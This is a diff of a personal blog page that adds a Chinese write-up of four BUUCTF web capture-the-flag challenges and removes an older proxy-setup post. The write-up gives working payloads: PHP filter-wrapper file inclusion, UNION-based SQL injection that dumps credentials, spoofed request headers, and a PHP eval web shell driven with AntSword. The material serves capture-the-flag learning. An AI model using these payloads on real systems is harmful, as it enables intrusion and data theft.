@@ -73,6 +73,126 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Buuctf Web（9-12）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-08T13:24:46.000Z" itemprop="datePublished">2023-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（9-12）"><a href="#Buuctf-Web（9-12）" class="headerlink" title="Buuctf Web（9-12）"></a>Buuctf Web（9-12）</h3><h4 id="9、Secret-File"><a href="#9、Secret-File" class="headerlink" title="9、Secret File"></a>9、Secret File</h4><p>查看源代码，有一个Archive_room.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f92bc8c-c00d-49e5-b321-488e99af3728" alt="image"></p>
+<p>查看该文件，有一个按钮</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f52ac5a-eb0a-4597-9639-8eb419803978" alt="image"></p>
+<p>点击按钮，没看到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28a170be-68bb-4f90-9875-e7bf863111a0" alt="image"></p>
+<p>从按钮处抓包，看到有一个secr3t.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d9d3bb9-5590-4daf-8431-6b327283fc89" alt="image"></p>
+<p>查看该文件，flag在flag.php里</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/970159db-f8ad-41b9-9a37-5fc0c5d48a0e" alt="image"></p>
+<p>查看该文件，还是没看到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ece77017-09c0-4f2e-9f32-8ec19c9a01af" alt="image"></p>
+<p>想到了PHP的封装协议，利用了filter伪协议，该协议刚好就能够查看文件包含的漏洞，所以当我们利用该协议查看flag.php时，会将它的源代码爆出来，但是因为base64的加密原因，所以我们还需要进行一次base64解密</p>
+<p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/164dbeeb-bc18-4496-86b6-5c9324f74dfb" alt="image"></p>
+<p>看到一串base64编码，解码后得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/70bf11c6-f0cc-4c1d-912a-73bbfac52ebf" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;657993f7-ec4c-4ccd-a411-1fbca834a5b5&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="10、LoveSQL"><a href="#10、LoveSQL" class="headerlink" title="10、LoveSQL"></a>10、LoveSQL</h4><p>尝试万能密码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176" alt="image"></p>
+<p>有显示</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978" alt="image"></p>
+<p>尝试联合查询，查到3的时候回显正常</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296" alt="image"></p>
+<p>爆数据库password&#x3D;:<code>1&#39; union select 1,2,database()#</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc" alt="image"></p>
+<p>爆出数据库名为geek</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7" alt="image"></p>
+<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190" alt="image"></p>
+<p>爆出表名为geekuser</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc" alt="image"></p>
+<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae" alt="image"></p>
+<p>爆出表名为l0ve1ysq1</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0" alt="image"></p>
+<p>爆列名password&#x3D;<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a" alt="image"></p>
+<p>id,username,password</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262" alt="image"></p>
+<p>爆数据：<code>/check.php?username=1&amp;password=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419" alt="image"></p>
+<p>查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7904eee7-45b3-4f8b-8eac-ecab975dac71&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="11、Http"><a href="#11、Http" class="headerlink" title="11、Http"></a>11、Http</h4><p>查看页面源代码，发现有个Secret.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32" alt="image"></p>
+<p>查看该文件，有一个网址</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d" alt="image"></p>
+<p>提示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com’,就是说这个页面得来自https//www.Sycsecret.com%EF%BC%8C%E6%B7%BB%E5%8A%A0referer%E5%8D%B3%E5%8F%AF">https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer头用于告诉web服务器，用户是从哪个页面找过来的</span><br></pre></td></tr></table></figure>
+
+<p>添加<code>Referer:https://www.Sycsecret.com</code>，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</span><br></pre></td></tr></table></figure>
+
+<p>添加<code>User-Agent:Syclover</code>，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5" alt="image"></p>
+<p>添加<code>X-Forwarded-For:127.0.0.1</code>，send，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43a4b431-f334-44b4-bcb3-aadf626871ac&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="12、Knife"><a href="#12、Knife" class="headerlink" title="12、Knife"></a>12、Knife</h4><p>使用蚁剑，安装教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367151320">渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)</a></p>
+<p>构造payload：<code>/?&lt;?php eval($_POST[&quot;Syc&quot;]);?&gt;</code></p>
+<p>打开蚁剑添加数据</p>
+<p>URL地址为：<a target="_blank" rel="noopener" href="http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php">http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php</a></p>
+<p>密码为：Syc</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd" alt="image"></p>
+<p>测试连接，连接成功，再点击添加</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10" alt="image"></p>
+<p>右键单击，选择文件管理</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa" alt="image"></p>
+<p>查看根目录，发现有个flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52" alt="image"></p>
+<p>双击查看，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1248bbb7-c099-4589-a699-63d87c2ec2d3&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" data-id="cll2ftaqf00004gvf6qb62b6u" data-title="Buuctf Web（9-12）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Buuctf Web（1-8）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" class="article-date">
@@ -1255,72 +1375,6 @@
 
 
   
-    <article id="post-clash科学上网" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/24/clash%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" class="article-date">
-  <time class="dt-published" datetime="2023-07-24T12:54:07.000Z" itemprop="datePublished">2023-07-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/24/clash%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/">clash科学上网</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>登录clash官方网站</p>
-<p><a target="_blank" rel="noopener" href="https://ikuuu.art/">https://ikuuu.art/</a></p>
-<p>（网站可能会挂，按照提示访问新域名）</p>
-<p>在左侧<strong>下载和教程</strong>中选择<strong>Linux使用教程</strong></p>
-<p>1、在用户目录下创建clash文件夹</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir clash</span><br><span class="line">cd clash</span><br></pre></td></tr></table></figure>
-
-<p>2、下载clash二进制文件并解压，重命名为clash，存放在clash目录下</p>
-<p>下载链接：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Dreamacro/clash/releases">Releases · Dreamacro&#x2F;clash (github.com)</a></p>
-<p>我下载的是<strong>clash-linux-amd64-v3-v1.17.0.gz</strong></p>
-<p>改名为clash.gz后解压为clash文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dv clash.gz</span><br></pre></td></tr></table></figure>
-
-<p>3、执行如下命令，下载clash配置文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O config.yaml &quot;https://api.sub-200.club/link/k726BxGA2nMeyL8V?clash=3&quot;</span><br></pre></td></tr></table></figure>
-
-<p>4、启动clash，同时启动HTTP代理和Socks5代理，注意先修改权限</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x clash</span><br><span class="line">./clash -d .</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7b3f3f8b-2b2f-4e19-88c4-8652235a1787" alt="image"></p>
-<p>5、访问<a target="_blank" rel="noopener" href="https://clash.razord.top/#/proxies">Clash (razord.top)</a>可以切换节点，测试延迟等操作</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d6a0bd4-73fe-4f83-b06e-9d47b9e36f26" alt="image"></p>
-<p>6、打开系统设置，选择网络，点击网络代理右边的设置按钮，选择手动，修改HTTP和HTTPS代理，如下图所示</p>
-<p> <img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f10d15b-3067-4930-b328-233400d24af2" alt="image"></p>
-<p>可顺利访问外网</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/24/clash%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" data-id="clkgvhy580000jsvf8zuu2yhx" data-title="clash科学上网" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1371,6 +1425,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/14/20240214/">20240214</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
           </li>
         
@@ -1384,10 +1442,6 @@
         
           <li>
             <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/01/Web-SQLi1/">SQLi1</a>
           </li>
         
       </ul>
